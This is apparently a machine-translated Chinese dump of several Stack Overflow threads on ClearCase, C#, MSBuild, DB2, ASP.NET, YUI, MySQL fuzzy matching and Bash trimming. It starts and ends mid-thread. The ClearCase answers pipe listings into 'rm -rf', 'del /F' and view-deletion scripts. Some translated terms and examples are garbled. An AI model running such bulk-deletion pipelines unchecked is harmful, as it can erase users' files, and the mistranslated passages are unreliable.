我想知道是否有内置方法可以进行“智能安排”，或者我是否需要自己实现此代码。

作为旁注，有没有办法自动化平铺和级联视图？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T21:35:11.367

对于平铺和级联，您想使用 Form.LayoutMdi()。

如果您想要比这更复杂的东西，那么您需要编写一些代码。

# bash - 用于删除所有 ClearCase 视图私有文件的命令行

> ID：369697
> 
> 赞同：16
> 
> 时间：2008-12-15T21:04:36.813
> 
> 标签：bash, cygwin, clearcase

我正在寻找一个命令行来从 Windows 上的 ClearCase 视图中删除所有视图私有文件和目录。我也有 Cygwin 可用。

[本文](http://www.ibm.com/developerworks/rational/library/4687.html)中提供的脚本并不是我想要的，因为我正在处理大量文件并且想要将它们全部删除而不必选择每个文件。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2008-12-15T22:42:54.790

几点说明：

*   `ct lsprivate`非常适合动态视图，而不是快照视图
*   `ct ls -rec -view_only`以及`ct lsprivate`列出您签出的文件...我不确定您是否要删除这些...

要列出私人文件（仅私人文件，而不是您可能想要保留的被劫持文件），您需要一个命令：

*   考虑名称中的空格
*   不列出结帐或劫持或黯然失色的文件或符号链接
*   适用于快照和动态视图
*   （奖励）不依赖于外部 shell 命令

    `for /F "usebackq delims=" %i in (`cleartool ls -r ^| find /V "Rule:" ^| find /V "hijacked" ^| find /V "eclipsed" ^| find /V "-->"`) do @echo "%i"`

这以纯 Windows 方式（不需要外部 shell 依赖）列出了您的所有私有文件（跳过被劫持/黯淡/签出或非私有文件以及符号链接）。
替换`@echo "%i"`，`del /F "%i"`它们就消失了。
请注意 %i 周围的双引号，以便正确显示/删除名称中带有空格的文件。还要注意 cleartool 参数 -nxn 的缺失，否则符号链接将无法区分，并且无论如何都不会修饰视图私有文件。

为了也摆脱私有目录，首先运行命令 with`rmdir /S /Q "%i"`然后 with `del /F "%i"`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-23T10:26:59.343

在 windows DOS 提示符下：

```
for /f "delims=" %f in ('cleartool lspriv -s -do -oth ^| sort /r') do @del /f /q "%f" 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-16T21:16:53.947

I know that there is probably a better way but I always seem to come back to this one:

```
ct lspriv | grep -v checkedout | xargs rm -rf 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-15T21:06:13.003

I've always used:

```
ct lsprivate  | xargs rm 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-28T17:30:55.280

在 Unix（动态视图）上，删除视图私有文件的一种非常有效的技术是删除视图。首先保留 cspec。还要确保视图中没有结帐。然后删除它并重新创建一个新的（相同的名称，相同的 cspec，相同的存储，但在创建它们之前没有私有文件）。

```
# With the view to be cleaned as your current view...
ct pwv -s > /tmp/viewname
viewname=$(</tmp/viewname)
ct catcs > /tmp/$viewname.cs
ct lsview -cvi | awk '{print $3;}' > /tmp/$viewname.vws
# The next line is the first dangerous line!
# It cancels all outstanding checkouts and removes the modified files
ct lsco -cvi -s -avo 2>/dev/null | xargs ct unco -rm  # Or: xargs ct ci -nc
exit            # Terminate the session in the view
viewname=$(</tmp/viewname)
rm /tmp/viewname
# The next line is the second dangerous line
ct rmview -tag $viewname
ct mkview -tag $viewname $(</tmp/$viewname.vws)
ct setcs  -tag $viewname /tmp/$viewname.cs
rm /tmp/$viewname.cs 
```

所有查看私人文件都消失了 - 您已将磁盘使用量降至最低。

如果您有幸只使用单个 VOB，则可以省略 ' `-avo`'（所有 VOB）选项。' `2>/dev/null`' 重定向会丢失来自无法访问的 VOB 的错误 - 我的环境中有 100 多个可见但无法访问的 VOB，除了我真正使用的十几个可访问的 VOB。

请注意，如果您将其打包为“ `rebuild.view`”脚本，则将视图名称作为参数（从视图外部工作 - 它不是当前视图），然后您可以在视图内部进行清理，使用一个不同的 'lsview' 选项来获取所需的详细信息，并且通常远离 /tmp 中的临时存储（尽管您需要在某处缓存 cspec）。

还有一点需要注意 - 您需要确保在自动松开之前已完成手动清理。例如，不应该有结帐。或者，如果有任何结帐，编写脚本以拒绝删除视图。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-15T21:07:45.353

我最终在 Cygwin 中使用了这个命令：

```
cleartool ls -recurse -view_only | sed -e 's:\\:/:g' | xargs rm -r 
```

sed 是将 cleartool 输出的 Windows 样式路径更改为 Unix 样式路径所必需的。那里可能有更有效的命令。这会引发很多错误，因为它会删除目录，然后 rm 将找不到该目录下的任何先前找到的视图私有文件。但你最终会得到正确的结果。

**编辑：VonC 指出这只适用于动态 ClearCase 视图**

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-06-28T09:49:12.017

1.  从 CLI 要列出查看私有文件，请执行以下命令

    ```
    for /F "usebackq delims=" %i in (`cleartool lspriv -s ^| find /V "Rule:" ^| find /V "hijacked" ^| find /V "eclipsed"`) do @echo "%i" 
    ```

2.  从执行以下命令的 CLI 删除查看私有文件

    ```
    for /F "usebackq delims=" %i in (`cleartool lspriv -s ^| find /V "Rule:" ^| find /V "hijacked" ^| find /V "eclipsed"`) do del /F "%i" 
    ```

3.  将视图与项目同步：
    从项目资源管理器中选择流属性，转到视图选项卡，选择视图属性，然后单击“与项目同步”

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-02-11T15:08:35.693

在纯窗口中，您可以这样做：

```
for /F "delims=" %i IN ('ct lsprivate') DO rm -rf "%i" 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-15T21:57:42.727

使用 cygpath 命令代替 sed 怎么样？
您可以在此处找到有关 cygpath.exe 的更多信息：
[链接文本](http://www.cygwin.com/cygwin-ug-net/using-utils.html)

将 cygpath.exe 与其他程序链接的一种方法是使用 xargs。
示例：进程A | xargs cygpath -u > my-path-in-unix-format.txt

# c# - Create DataTable with DB table structure

> ID：369702
> 
> 赞同：3
> 
> 时间：2008-12-15T21:05:19.353
> 
> 标签：c#, sql-server

What is the best way to create a DataTable with the same structure as a table in my SqlServer database? At present, I am using SqlDataAdapter.Fill() with a query that brings back the columns but no rows. That's works fine, but it seems klutzy.

Is there a better way?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T21:09:16.770

那么，如果你使用Linq2Sql，你可以通过实体类进行反射，并根据属性名称和数据类型创建数据表。

```
 Type type = typeof(Product); //or whatever the type is
            DataTable table = new DataTable();
            foreach(var prop in type.GetProperties())
            {
                table.Columns.Add(prop.Name, prop.PropertyType);
            } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T21:29:49.053

看看这个方法，SqlDataAdapter.FillSchema()，[MSDN](http://msdn.microsoft.com/en-us/library/152bda9x.aspx)上的文章会告诉你怎么用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-01-06T09:51:49.040

转换代码效果很好。它没有考虑到数据库可能具有可为空的类型。我为此添加了一个检查并将可为空的字段转换为不可为空的字段。

```
 Type type = typeof(Product); //or whatever the type is
 DataTable table = new DataTable();
 foreach(var prop in type.GetProperties())
 {
     Type colType = prop.PropertyType;
     if (colType.IsGenericType && colType.GetGenericTypeDefinition() == typeof(Nullable<>))
     {
         System.ComponentModel.NullableConverter nc = new System.ComponentModel.NullableConverter(colType);
         colType = nc.UnderlyingType;
     }
     table.Columns.Add(prop.Name, colType);
 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T21:07:30.177

好吧，你不知道结构吗？

“SET FMT_ONLY ON”或“WHERE 1 = 0”技巧都经过了很好的测试（结果不同）。

这里的查询是动态的吗？我忍不住想你应该已经知道架构了......

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-16T19:34:53.967

Yes, I know what the schema is now, but it may change, and the code should adapt. Besides, who wants to type in specs for 33 fields. If I understand correctly, my solution was of the "where 1 = 0" type. I think that FillSchema should also work, but there are hidden hazards since it wants to enforce the primary key. Since I am reading data that may have errors as part of the validation process, I can't be sure the primary key won't be duplicated.

Thanks.

# msbuild - 使用 MSBuild 的新构建不包括新类

> ID：369714
> 
> 赞同：3
> 
> 时间：2008-12-15T21:07:47.710
> 
> 标签：msbuild

我通常使用 MSBuild 构建我的解决方案，以保持 Visual Studio 的响应速度并节省一些时间。现在，我在命令行运行的非常简单：

```
MSBuild.exe /m "C:\MyProject\MyProject.sln" 
```

到目前为止，这工作得很好。但是，今天我向一个类库项目中添加了一个类，其 DLL 通过我的应用程序中的反射加载，我无法创建新类的对象。我在调试器中查看了我已加载的 DLL 中包含的类型，但我的新类型不存在。我用反射器得到了同样的结果。

当我终于回到 IDE 时，右键单击项目，然后选择“重建”，我的新类型出现在 Reflector 中。

是否可以在 MSBuild 中设置一些设置或命令行标志以确保每次都捕获新的更改？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T21:14:48.303

这可能听起来像一个愚蠢的问题，但你确定新的类文件被保存了吗？重建通常会自动保存所有文件，而 MSBuild 不会。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T21:11:50.650

我发现，从历史上看，MS IDE 在您要求时并不总是保存项目和解决方案文件……这可能与问题有关，但也许不是。

然而，也许它就像这样简单：

尝试添加 /t:rebuild

MSBuild.exe /m "C:\MyProject\MyProject.sln" /t:rebuild

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T21:20:08.217

原来是未保存的文件问题。它实际上不是新的类文件；该文件已保存。在 IDE 中添加新的类文件后，没有保存的是*.csproj文件。*如果我单击“全部保存”或突出显示该项目并单击“保存”，MSBuild 就可以正常工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T21:12:05.020

尝试在您的 msbuild 命令行调用中指定“ReBuild”。

msbuild /t:重建 /p:Configuration=Debug

调味。

# migration - DB2 - 什么是 NF（新功能）模式？

> ID：369727
> 
> 赞同：6
> 
> 时间：2008-12-15T21:10:17.643
> 
> 标签：migration, db2, mainframe, zos

我有一些关于 DB2 NF 模式的客户问题。谷歌对此知之甚少。

我已经能够**推断**出以下内容，但我并不完全相信它......

1.  NF 和 CM（兼容模式）是大型机上 DB2 v8 上的设置。
2.  CM 中 z/OS 上的 DB2 v8 旨在允许 DB2 v8 用作 DB2 v7 的替代品。
3.  NF 进行了许多破坏向后兼容性的更改。
4.  特别是“数据字典”系统表完全重新设计。

我怀疑以下内容，但我更不确定...

1.  重新设计的数据字典和系统表类似于 DB2 v8 在 Linux/Unix/Windows 上使用的那些。
2.  DB2 v8 NF 在很大程度上与 DB2 v9 兼容。
3.  DB2 v9 跨平台（Linux/Unix/Windows 和大型机）更加一致。
4.  为与 DB2 v8 NF 一起工作而编写的代码通常可以在任何地方与 DB2 v8 on LUW 和 DB2 v9 一起正常工作。

谁能告诉我我是否正确？或者添加更多细节？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-16T04:48:38.623

这些功能模式基本上只是进行计划升级的方法。DB2/z v8 和 v9（可能还有所有即将推出的）都具有三种模式：

*   兼容性（CM）。
*   启用新功能 (ENFM)。
*   新功能（NFM）。

它用于确保版本之间的平滑过渡。例如，必须先将组中的所有 DBMS 升级到 v8 CM，然后才能将它们中的任何一个切换到 v8 ENFM。

兼容模式`vX`意味着您正在使用`vX`但没有任何新功能（换句话说，相当于`v(X-1)`. 如果您目前正在运行 v7，则不受支持 - 您确实*应该*在 CM 中运行 v8（如果您关心关于支持，相信我，如果您向 IBM 支付巨额许可费，您应该关心 :-)。

启用新功能模式是当数据库系统表已更新为使用新功能而不是用户表时。

新功能模式意味着系统和用户表都启用了新功能。

新功能的实际内容取决于版本。

[有关v8 的新增功能](http://publibz.boulder.ibm.com/cgi-bin/bookmgr_OS390/BOOKS/DSNWNJ11/CCONTENTS?SHELF=DSNSHJA6&DN=GC18-7428-01&DT=20061212110132)信息，请参见此处。基本上第 2 章列出了所有新功能：

*   更多 SQL 好东西。
*   更安全。
*   更好地兼容 DB2/z 的小兄弟 (LUW)，包括 Unicode。
*   可扩展性/性能。
*   可用性（在大型机世界中非常重要）。

顺便说一句，IBM 将其所有文档都放在了 Web 上以供阅读，顶级公共图书馆可以在[此处](http://publibz.boulder.ibm.com/cgi-bin/bookmgr_OS390/library)找到。

# css - 将按钮的可见属性分配给静态方法结果

> ID：369736
> 
> 赞同：10
> 
> 时间：2008-12-15T21:14:46.697
> 
> 标签：css, asp.net, .net

我正在尝试使用以下代码根据用户的角色隐藏按钮：

```
 <asp:Button ID="btndisplayrole" Text="Admin Button" Visible='<%= WebApplication1.SiteHelper.IsUserInRole("Admin") %>' runat="server" OnClick="DisplayRoleClick" /> 
```

但是当我运行上面的代码时，我收到以下错误消息：

无法从“可见”的字符串表示“<%= WebApplication1.SiteHelper.IsUserInRole("Admin") %>' 创建类型为“System.Boolean”的对象

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T23:43:00.113

有点有趣的问题。但正如错误消息所述，字符串`<%= WebApplication1.SiteHelper.IsUserInRole("Admin") %>`无法转换为布尔值。

不幸的是，我无法解释为什么不评估表达式，而是将其视为字符串。

您的表达式按预期工作的原因`<%# %>`是因为它的处理方式大不相同。当 Page 被编译成一个类时，编译器会创建一个类似这样的事件处理程序：

```
public void __DataBindingButton2(object sender, EventArgs e)
{
    Button button = (Button) sender;
    Page bindingContainer = (Page) button.BindingContainer;
    button.Visible = HttpContext.Current.User.IsInRole("admin");
} 
```

并将此方法连接到控件上的 Control.Databinding 事件。如您所见，`<%# %>`这一次被正确地视为服务器代码，而不仅仅是随机字符串。

所以我想解决方案是使用数据绑定，或者按照 AndreasKnudsen 的建议使用代码隐藏。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-25T02:36:46.593

作为替代解决方案：

```
<% if (WebApplication1.SiteHelper.IsUserInRole("Admin"))
    {%>
        <asp:Button ID="btndisplayrole" 
                    Text="Admin Button" 
                    runat="server" 
                    OnClick="DisplayRoleClick" /> 
<%} %> 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-15T21:22:04.733

以下代码有效：

```
Visible='<%# WebApplication1.SiteHelper.IsUserInRole("Admin") %>' 
```

注意 aboe 使用绑定表达式！

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T22:47:06.543

只是在代码隐藏中执行它怎么样，例如在 Page_Load 上？

```
public void Page_Load( object sender, EventArgs e )
{
   btndisplayrole.Visible = WebApplication1.SiteHelper.IsUserInRole("Admin");
} 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-12-15T21:17:49.313

```
Visible='<%= WebApplication1.SiteHelper.IsUserInRole("Admin").ToString() %>' 
```

或者

```
Visible=<%= WebApplication1.SiteHelper.IsUserInRole("Admin") %> 
```

# css - 如何使 YUI 选项卡右对齐？

> ID：369739
> 
> 赞同：0
> 
> 时间：2008-12-15T21:14:59.117
> 
> 标签：css, yui

对于以下示例：

[http://developer.yahoo.com/yui/examples/tabview/frommarkup_clean.html](http://developer.yahoo.com/yui/examples/tabview/frommarkup_clean.html)

我想让标签右对齐并仍然保留当前顺序。

我敢肯定它很简单——离它太近了，看不到解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T21:34:35.567

在我头上，怎么样：

```
 <div id="demo" class="yui-navset">
    <ul class="yui-nav" style="text-align:right;">
        <li><a href="#tab1"><em>Tab One Label</em></a></li>
        <li class="selected"><a href="#tab2"><em>Tab Two Label</a></li>
        <li><a href="#tab3"><em>Tab Three Label</em></a></li>
    </ul>            
    <div class="yui-content">
        <div id="tab1"><p>Tab One Content</p></div>
        <div id="tab2"><p>Tab Two Content</p></div>
        <div id="tab3"><p>Tab Three Content</p></div>
    </div>
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T21:17:52.887

您是否尝试过应用“文本对齐：对；” 到容器 div ：

```
<div id="demo" class="yui-navset"> 
```

?

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T21:41:21.840

da5id 和 Kevin Le 说了什么。

在 CSS 文件中，添加以下行：ul.yui-nav { text-align:right; }

这是相同的解决方案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-08T16:06:49.967

**HTML 代码：**

```
<div id="demo" class="yui-navset">
<div class ="tabs-nav" >
    <ul class="yui-nav" >
        <li><a href="#tab1"><em>Tab One Label</em></a></li>
        <li class="selected"><a href="#tab2"><em>Tab Two Label</a></li>
        <li><a href="#tab3"><em>Tab Three Label</em></a></li>
    </ul>  
</div>          
    <div class="yui-content">
        <div id="tab1"><p>Tab One Content</p></div>
        <div id="tab2"><p>Tab Two Content</p></div>
        <div id="tab3"><p>Tab Three Content</p></div>
    </div>
</div> 
```

**CSS：**

```
div.tabs-nav {height: 45px;} /* important to set div's height so your tabs navigation does not fall in to the tabs content */
ul.yui-nav { float: right;}
ul.yui-nav li { float: left;} 
```

# winapi - 在另一个程序禁用它后重新启用（windows）键

> ID：369748
> 
> 赞同：-1
> 
> 时间：2008-12-15T21:18:42.993
> 
> 标签：winapi, keyboard-shortcuts, hotkeys

Quake3 已禁用**alt**和**windows**键。

即使在 quake3 运行时，有什么方法可以重新启用它们吗？即使我打开游戏，我也需要这些钥匙。

我认为它的工作方式是游戏使用 RegisterHotKey 注册一个热键，然后每次按下键时将处理的属性设置为 true。

因此，如果您在 quake3-window 上的这些键上使用 UnRegisterHotkey，我猜这些键将再次开始工作。问题是您不知道禁用键有什么热键ID。

有没有办法枚举窗口已注册的热键以获取所有热键 ID？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-16T12:24:21.293

Quake3 很可能根本不使用 RegisterHotKey，而是使用 DirectInput。在这种情况下，它很可能将键盘保持在独占模式，这解释了为什么 Windows 键不起作用 - 是操作系统禁用了它。引用[MSDN](http://msdn.microsoft.com/en-us/library/bb219804%28VS.85%29.aspx)：“在独占模式下，Windows 徽标键始终处于禁用状态。”

# mysql - 如何使用 PHP 对 MYSQL 中的公司名称进行模糊匹配以实现自动完成？

> ID：369755
> 
> 赞同：56
> 
> 时间：2008-12-15T21:21:50.037
> 
> 标签：mysql, string, matching, fuzzy-search

我的用户将通过剪切和粘贴一个包含公司名称的大字符串来导入。

我有一个现有且不断增长的 MYSQL 公司名称数据库，每个数据库都有一个唯一的 company_id。

我希望能够解析字符串并为每个用户输入的公司名称分配一个模糊匹配。

现在，只是做一个直接的字符串匹配，也很慢。** Soundex 索引会更快吗？如何在用户输入时为他们提供一些选项？**

例如，有人写道：

```
微软 -> 微软
基本要素 -> 基本要素
Polycom, Inc. -> 宝利通

```

我发现以下似乎与此问题相似的线程，但发帖人尚未批准，我不确定他们的用例是否适用：

[如何在大型字符串数据库中找到字符串的最佳模糊匹配](https://stackoverflow.com/questions/309479/how-to-find-best-fuzzy-match-for-a-string-in-a-large-string-database)

[在 Java 中匹配不准确的公司名称](https://stackoverflow.com/questions/322701/matching-inexact-company-names-in-java)

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2008-12-15T21:56:17.580

您可以从 using 开始[`SOUNDEX()`](http://en.wikipedia.org/wiki/Soundex)，这可能会满足您的需要（我想象了一个自动建议框，其中包含用户正在输入的现有替代方案）。

的缺点`SOUNDEX()`是：

*   它无法区分较长的字符串。仅考虑前几个字符，最后发散的较长字符串会生成相同的 SOUNDEX 值
*   第一个字母必须相同，否则您将无法轻松找到匹配项。SQL Server 具有 DIFFERENCE() 函数来告诉您两个 SOUNDEX 值相距多少，但我认为 MySQL 没有内置这种类型。
*   对于 MySQL，至少根据[文档](http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_soundex)，SOUNDEX 无法用于 unicode 输入

例子：

```
SELECT SOUNDEX('Microsoft')
SELECT SOUNDEX('Microsift')
SELECT SOUNDEX('Microsift Corporation')
SELECT SOUNDEX('Microsift Subsidary')

/* all of these return 'M262' */ 
```

对于更高级的需求，我认为您需要查看两个字符串的[Levenshtein 距离](http://en.wikipedia.org/wiki/Levenshtein_distance)（也称为“编辑距离”）并使用阈值。这是更复杂（=更慢）的解决方案，但它允许更大的灵活性。

主要缺点是，您需要两个字符串来计算它们之间的距离。使用 SOUNDEX，您可以将预先计算的 SOUNDEX 存储在您的表中，并对其进行比较/排序/分组/过滤。使用 Levenshtein 距离，您可能会发现“Microsoft”和“Nzcrosoft”之间的差异只有 2，但要得出这个结果还需要更多时间。

无论如何，可以在[codejanitor.com 上找到 MySQL 的 Levenshtein 距离函数示例：作为 MySQL 存储函数的 Levenshtein 距离（2007 年 2 月 10 日）](http://www.artfulsoftware.com/infotree/queries.php#552)。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2008-12-18T23:07:49.103

SOUNDEX 是一个很好的算法，但最近在这个主题上取得了进展。创建了另一种称为 Metaphone 的算法，后来将其修改为双 Metaphone 算法。我个人使用了双变音器的 java apache commons 实现，它是可定制的和准确的。

他们在维基百科页面上也有许多其他语言的实现。这个问题已经得到解答，但是如果您发现任何已识别的 SOUNDEX 问题出现在您的应用程序中，很高兴知道有选项。有时它可以为两个完全不同的单词生成相同的代码。创建了双变音位来帮助解决这个问题。

从维基百科窃取：[http ://en.wikipedia.org/wiki/Soundex](http://en.wikipedia.org/wiki/Soundex)

> 作为对 Soundex 算法缺陷的回应，Lawrence Philips 出于同样的目的开发了 Metaphone 算法。飞利浦后来对 Metaphone 进行了改进，他称之为 Double-Metaphone。Double-Metaphone 包含比其前身更大的编码规则集，处理非拉丁字符的子集，并返回主要和次要编码以解释英语中单个单词的不同发音。

在双变音位页面的底部，他们有各种编程语言的实现：[http ://en.wikipedia.org/wiki/Double-Metaphone](http://en.wikipedia.org/wiki/Double-Metaphone)

Python & MySQL 实现：[https ://github.com/AtomBoy/double-metaphone](https://github.com/AtomBoy/double-metaphone)

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-08-17T16:13:47.293

首先，我想补充一点，在使用任何形式的语音/模糊匹配算法时都应该非常小心，因为这种逻辑正是如此，模糊或更简单地说；可能不准确。用于匹配公司名称时尤其如此。

一个好的方法是从其他数据中寻求佐证，例如地址信息、邮政编码、电话号码、地理坐标等。这将有助于确认您的数据被准确匹配的可能性。

有很多与 B2B 数据匹配相关的问题需要在这里解决，我在我的博客（也是[更新的文章）中写了更多关于](https://www.match2lists.com/blog/best-practice/company-name-matching)[公司名称匹配](http://web.archive.org/web/20160905115512/http://blog.match2lists.com/data-matching/b2b-data-matching-fuzzy-matching-company-names/)的内容，但总的来说，关键问题是：

*   查看整个字符串是没有帮助的，因为公司名称中最重要的部分不一定位于公司名称的开头。即“Proctor and Gamble Company”或“United States Federal Reserve”</li>
*   缩写在公司名称中很常见，例如 HP、GM、GE、P&G、D&B 等。
*   一些公司故意将其名称拼写错误，作为其品牌的一部分，并将自己与其他公司区分开来。

匹配精确数据很容易，但匹配非精确数据可能会花费更多时间，我建议您应该考虑如何验证非精确匹配以确保这些匹配具有可接受的质量。

在我们建立 Match2Lists.com 之前，我们曾经花费大量时间来验证模糊匹配。在 Match2Lists 中，我们集成了一个强大的可视化工具，使我们能够查看非精确匹配，这在匹配验证方面被证明是一个真正的游戏规则改变者，降低了我们的成本并使我们能够更快地交付结果。

祝你好运！！

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-15T21:28:29.510

这是mysql 和 php[中 soundex 函数的 php 讨论的链接。](http://us3.php.net/soundex)我将从那里开始，然后扩展到您的其他定义不那么明确的要求。

您的参考引用了 Levenshtein 匹配方法。两个问题。1.更适合测量两个已知单词之间的差异，而不是搜索。2\. 它讨论了一种解决方案，旨在更多地检测校对错误（使用“Levenshtien”作为“Levenshtein”）而不是拼写错误（用户不知道如何拼写，说“Levenshtein”并输入“Levinstein” . 我通常将它与在书中查找短语而不是在数据库中查找键值联系起来。

编辑：回应评论 -

1.  您至少可以让用户将公司名称放入多个文本框中吗？2\. 或使用明确的名称分隔符（比如反斜杠）；3\. 省略冠词（“The”）和通用缩写（或者您可以过滤这些）；4\. 挤出空格并与之匹配（所以微软 => microsoft，Bare Essentials => bareessentials）；5.过滤掉标点符号；6\. 对单词进行“OR”搜索（“bare”或“essentials”）——人们有时会不可避免地忽略其中一个。

疯狂地测试并使用来自用户的反馈循环。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-05-31T16:15:00.050

这个答案导致使用 2 或 3 个字符或更多字符的输入对几乎任何实体进行索引查找。

基本上，创建一个包含 2 列、word 和 key 的新表。在包含要模糊搜索的列的原始表上运行一个进程。此过程将从原始列中提取每个单独的单词，并将这些单词与原始键一起写入单词表。在此过程中，应丢弃经常出现的单词，例如“the”、“and”等。

然后我们在单词表上创建几个索引，如下...

*   word + key 上的普通小写索引
*   第 2 到第 5 个字符的索引 + 键
*   第 3 到第 6 个字符的索引 + 键

    或者，在 word 列上创建 SOUNDEX() 索引。

一旦这到位，我们接受任何用户输入并使用普通 word = input 或 LIKE input% 进行搜索。我们从不执行 LIKE %input，因为我们总是在前 3 个字符中的任何一个上寻找匹配项，这些字符都已编入索引。

如果您的原始表很大，您可以按字母表对单词表进行分区，以确保立即将用户的输入缩小到候选行。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2021-02-18T05:29:17.017

虽然问题询问如何在 MySQL 中进行模糊搜索，但我建议考虑使用单独的模糊搜索（又名容错）引擎来完成此操作。以下是一些需要考虑的搜索引擎：

*   ElasticSearch（开源，功能丰富，操作复杂）
*   Algolia（专有，但有很棒的文档并且超级容易启动和运行）
*   Typesense（开源，提供与 Algolia 相同的模糊搜索功能）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-19T16:35:29.750

模糊匹配的最佳函数是 levenshtein。它传统上被拼写检查器使用，所以这可能是要走的路。这里有一个 UDF：http: [//joshdrew.com/](http://joshdrew.com/)

使用 levenshtein 的缺点是它不能很好地扩展。一个更好的主意可能是将整个表转储到拼写检查器自定义字典文件中，并从您的应用程序层而不是数据库层执行建议。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-08-02T18:27:34.500

**在使用服务器端的受信任且经过良好测试的拼写检查库进行查询之前**检查它是否拼写错误，然后对原始文本和第一个建议的正确拼写进行简单查询（如果拼写检查确定它拼写错误）。

您可以为任何值得使用的拼写检查库创建自定义词典，您可能需要这样做以匹配更晦涩的公司名称。

匹配两个简单的字符串比对整个表进行 Levenshtein 距离计算要快得多。**MySQL 不太适合这种情况。**

我最近解决了一个类似的问题，浪费了很多时间摆弄算法，所以我真的希望有更多的人警告不要在 MySQL 中这样做。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-08-17T09:57:06.277

之前可能有人建议过，但为什么不将数据转储到 Excel 并使用 Fuzzy Match Excel 插件。这将给出从 0 到 1 的分数（1 为 100%）。

我为保存在数据库中的业务合作伙伴（公司）数据执行此操作。下载最新的 UK Companies House 数据并以此为依据进行评分。

对于 ROW 数据，它更复杂，因为我们必须进行更多手动处理。

# string - 如何从 Bash 变量中修剪空格？

> ID：369758
> 
> 赞同：1144
> 
> 时间：2008-12-15T21:24:01.093
> 
> 标签：string, bash, variables, trim

我有一个带有这段代码的 shell 脚本：

```
var=`hg st -R "$path"`
if [ -n "$var" ]; then
    echo $var
fi 
```

但是条件代码总是执行，因为`hg st`总是打印至少一个换行符。

*   有没有一种简单的方法可以去除空格`$var`（比如`trim()`在[PHP](http://en.wikipedia.org/wiki/PHP)中）？

或者

*   有处理这个问题的标准方法吗？

我可以使用[sed](http://en.wikipedia.org/wiki/Sed)或[AWK](http://en.wikipedia.org/wiki/AWK)，但我想有一个更优雅的解决方案来解决这个问题。

* * *

## 回答 #1

> 赞同：1307
> 
> 时间：2012-10-19T11:52:21.263

一个简单的答案是：

```
echo "   lol  " | xargs 
```

[Xargs](http://en.wikipedia.org/wiki/Xargs)将为您进行修剪。这是一个命令/程序，没有参数，返回修剪后的字符串，就这么简单！

注意：这不会删除所有内部空间，因此`"foo bar"`保持不变；它不会变成`"foobar"`. 但是，多个空格会被压缩为单个空格，所以`"foo bar"`会变成`"foo bar"`. 此外，它不会删除行尾字符。

* * *

## 回答 #2

> 赞同：1121
> 
> 时间：2010-07-12T21:31:19.300

让我们定义一个包含前导、尾随和中间空格的变量：

```
FOO=' test test test '
echo -e "FOO='${FOO}'"
# > FOO=' test test test '
echo -e "length(FOO)==${#FOO}"
# > length(FOO)==16 
```

* * *

如何删除所有空格（用`[:space:]`in表示`tr`）：

```
FOO=' test test test '
FOO_NO_WHITESPACE="$(echo -e "${FOO}" | tr -d '[:space:]')"
echo -e "FOO_NO_WHITESPACE='${FOO_NO_WHITESPACE}'"
# > FOO_NO_WHITESPACE='testtesttest'
echo -e "length(FOO_NO_WHITESPACE)==${#FOO_NO_WHITESPACE}"
# > length(FOO_NO_WHITESPACE)==12 
```

* * *

如何仅删除前导空格：

```
FOO=' test test test '
FOO_NO_LEAD_SPACE="$(echo -e "${FOO}" | sed -e 's/^[[:space:]]*//')"
echo -e "FOO_NO_LEAD_SPACE='${FOO_NO_LEAD_SPACE}'"
# > FOO_NO_LEAD_SPACE='test test test '
echo -e "length(FOO_NO_LEAD_SPACE)==${#FOO_NO_LEAD_SPACE}"
# > length(FOO_NO_LEAD_SPACE)==15 
```

* * *

如何仅删除尾随空格：

```
FOO=' test test test '
FOO_NO_TRAIL_SPACE="$(echo -e "${FOO}" | sed -e 's/[[:space:]]*$//')"
echo -e "FOO_NO_TRAIL_SPACE='${FOO_NO_TRAIL_SPACE}'"
# > FOO_NO_TRAIL_SPACE=' test test test'
echo -e "length(FOO_NO_TRAIL_SPACE)==${#FOO_NO_TRAIL_SPACE}"
# > length(FOO_NO_TRAIL_SPACE)==15 
```

* * *

如何同时删除前导空格和尾随空格——链接`sed`s：

```
FOO=' test test test '
